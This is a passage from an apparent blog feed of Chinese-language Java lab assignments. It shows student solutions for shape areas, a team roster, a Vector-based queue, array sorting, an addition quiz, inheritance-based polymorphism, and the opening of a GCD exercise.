class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_shape</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">shape shape[]=<span class="keyword">new</span> shape[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"请选择输入的图形：1、圆形，2、矩形，3、三角形："</span>);</span><br><span class="line"><span class="keyword">int</span> x=s.nextInt();</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"请输入圆形的半径："</span>);</span><br><span class="line">shape[i]=<span class="keyword">new</span> circle(s.nextFloat());</span><br><span class="line">System.out.println(<span class="string">"面积是："</span>+shape[i].area());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"请输入矩形宽和高："</span>);</span><br><span class="line">shape[i]=<span class="keyword">new</span> rectangle(s.nextFloat(),s.nextFloat());</span><br><span class="line">System.out.println(<span class="string">"面积是："</span>+shape[i].area());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"请输入三角形a,b,c:"</span>);</span><br><span class="line">shape[i]=<span class="keyword">new</span> square(s.nextFloat(),s.nextFloat(),s.nextFloat());</span><br><span class="line">System.out.println(<span class="string">"面积是："</span>+shape[i].area());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"非法输入，程序退出"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lUxjQs.png" alt="lUxjQs.png"></p><h3 id="三、"><a href="#三、" class="headerlink" title="三、"></a>三、</h3><p>编一程序，在其中定义一个代表篮球队的类，它有放置队员姓名的向量并放入队员的姓名，再写两个方法：</p><p>1）在向量中查找某人。若找到则输出“找到此人！”，否则输出“查无此人！”。</p><p>2）删除队员。先查找该人，若找到则删除，否则输出“无此队员！”。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">basketball</span> </span>&#123;</span><br><span class="line">String dy[]=<span class="keyword">new</span> String[<span class="number">10</span>];</span><br><span class="line">basketball()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">dy[i]=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dy[i]==<span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">dy[i]=name;</span><br><span class="line">System.out.println(<span class="string">"插入成功"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(String name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(dy[i].equals(name))</span><br><span class="line">&#123;</span><br><span class="line">dy[i]=<span class="keyword">null</span>;</span><br><span class="line">System.out.println(<span class="string">"删除成功"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i==<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"查无此人"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(dy[i]+<span class="string">","</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_basket</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">basketball b=<span class="keyword">new</span> basketball();</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"输入1插入，2删除，其它退出"</span>);</span><br><span class="line"><span class="keyword">int</span> x=s.nextInt();</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">b.insert(s.nextLine());</span><br><span class="line">b.show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">b.delete(s.nextLine());</span><br><span class="line">b.show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">b.show();</span><br><span class="line">System.out.println(<span class="string">"程序已退出"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lUzEl9.png" alt="lUzEl9.png"></p><h3 id="四、"><a href="#四、" class="headerlink" title="四、"></a>四、</h3><p>设计一个继承Vector类的队列类Queue，实现队列的先进先出功能, 类中含有两个方法：入队inqueue和出队outqueue(要充分利用Vector类的方法)。在主方法中创建一个队列类对象，然后依次完成 “111” 入队、“222”入队、出队一元素(输出到屏幕)、“333”入队，最后出队所有元素并且输出到屏幕。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">queue</span> <span class="keyword">extends</span> <span class="title">Vector</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">inqueue</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">addElement(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">outqueue</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Object b=firstElement();</span><br><span class="line">removeElementAt(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">queue q1=<span class="keyword">new</span> queue();</span><br><span class="line">q1.inqueue(<span class="string">"111"</span>);</span><br><span class="line">q1.inqueue(<span class="string">"222"</span>);</span><br><span class="line">Object bb=q1.outqueue();</span><br><span class="line">System.out.println(bb);</span><br><span class="line">q1.inqueue(<span class="string">"333"</span>);</span><br><span class="line">bb=q1.outqueue();</span><br><span class="line">System.out.println(bb);</span><br><span class="line">bb=q1.outqueue();</span><br><span class="line">System.out.println(bb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laSCnI.png" alt="laSCnI.png"></p><h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>java.util包中有个类“Arrays”，它有个方法“sort(&lt;数组名&gt;)”，功能是将数组按升序排序。请编一程序，在其中创建一个数组，然后利用sort方法进行排序。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw2;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">seven</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">System.out.println(<span class="string">"请输入10个数"</span>);</span><br><span class="line"><span class="keyword">int</span> a[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=s.nextInt();</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(a);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">System.out.print(a[i]+<span class="string">"\t"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laSMBq.png" alt="laSMBq.png"></p><h3 id="六、"><a href="#六、" class="headerlink" title="六、"></a>六、</h3><p>编写一个让小朋友做十次加法的程序，要求程序中生成两个不大于50的随机正整数a和b，其中a由Math类的随机函数生成，b则利用机器当前时间的秒数和分数生成，在小朋友回答后要给出对错的判断。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw4;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jisuanti</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(i&lt;<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">LocalDateTime time=LocalDateTime.now();</span><br><span class="line"><span class="keyword">int</span> a=(<span class="keyword">int</span>)(Math.random()*<span class="number">50</span>);</span><br><span class="line"><span class="keyword">int</span> b=(time.getMinute()+time.getSecond())%<span class="number">50</span>;</span><br><span class="line">System.out.println(a+<span class="string">"+"</span>+b+<span class="string">"="</span>);</span><br><span class="line"><span class="keyword">if</span>(s.nextInt()==(a+b))</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"yes"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"no"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lapZa6.png" alt="lapZa6.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Java第二次实验作业。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java继承实现多态的例子</title>
    <link href="https://1187100546.github.io/2019/11/29/java-fujia/"/>
    <id>https://1187100546.github.io/2019/11/29/java-fujia/</id>
    <published>2019-11-29T01:08:31.000Z</published>
    <updated>2019-11-29T01:28:20.834Z</updated>
    
    <content type="html"><![CDATA[<p>利用继承实现多态。</p><a id="more"></a><p>写一个动物园程序，可以向里面添加动物，并显示是第几个该类型的动物，并统计动物园里共有多少动物。</p><p>animal类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">animal</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">System.out.println(<span class="string">"动物园一共有"</span>+sum+<span class="string">"只动物"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dog类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dog</span> <span class="keyword">extends</span> <span class="title">animal</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> dog_sum=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">dog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>.sum++;</span><br><span class="line">dog_sum++;</span><br><span class="line">System.out.println(<span class="string">"我是狗，是第"</span>+dog_sum+<span class="string">"只狗"</span>);</span><br><span class="line"><span class="keyword">super</span>.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cat类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cat</span> <span class="keyword">extends</span> <span class="title">animal</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> cat_sum=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">cat</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>.sum++;</span><br><span class="line">cat_sum++;</span><br><span class="line">System.out.println(<span class="string">"我是猫，是第"</span>+cat_sum+<span class="string">"只猫"</span>);</span><br><span class="line"><span class="keyword">super</span>.show();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pig类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">pig</span> <span class="keyword">extends</span> <span class="title">animal</span></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> pig_sum=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">pig</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">super</span>.sum++;</span><br><span class="line">pig_sum++;</span><br><span class="line">System.out.println(<span class="string">"我是猪，是第"</span>+pig_sum+<span class="string">"只猪"</span>);</span><br><span class="line"><span class="keyword">super</span>.show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main_animal</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">show_interface</span><span class="params">(animal sc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">sc.show();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Scanner s=<span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">animal an=<span class="keyword">new</span> animal();</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"请输入添加的动物类型(dog,cat,pig)(输入exit退出程序)："</span>);</span><br><span class="line">String m=s.nextLine();</span><br><span class="line"><span class="keyword">if</span>(m.equals(<span class="string">"exit"</span>))</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"程序已退出"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(m)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span>(<span class="string">"dog"</span>):</span><br><span class="line">&#123;</span><br><span class="line">an=<span class="keyword">new</span> dog();</span><br><span class="line">show_interface(an);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span>(<span class="string">"cat"</span>):</span><br><span class="line">&#123;</span><br><span class="line">an=<span class="keyword">new</span> cat();</span><br><span class="line">show_interface(an);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span>(<span class="string">"pig"</span>):</span><br><span class="line">&#123;</span><br><span class="line">an=<span class="keyword">new</span> pig();</span><br><span class="line">show_interface(an);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"非法字符,重新输入"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><p><img src="https://s2.ax1x.com/2019/11/29/QkAELR.png" alt="QkAELR.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;利用继承实现多态。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java实验三</title>
    <link href="https://1187100546.github.io/2019/11/26/java-shiyan-3/"/>
    <id>https://1187100546.github.io/2019/11/26/java-shiyan-3/</id>
    <published>2019-11-26T12:09:39.000Z</published>
    <updated>2019-11-26T12:40:02.335Z</updated>
    
    <content type="html"><![CDATA[<p>Java实验三。</p><a id="more"></a><h3 id="问题1、"><a href="#问题1、" class="headerlink" title="问题1、"></a>问题1、</h3><p>编一程序，求两个正整数m、n的最大公约数。要求程序中有两个方法，分别使用循环和递归求最大公约数，最后在主方法中分别调用这两个方法求解56与91的最大公约数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">cyc</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(x%y!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> s=x%y;</span><br><span class="line">x=y;</span><br><span class="line">y=s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rec</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x%y==<span 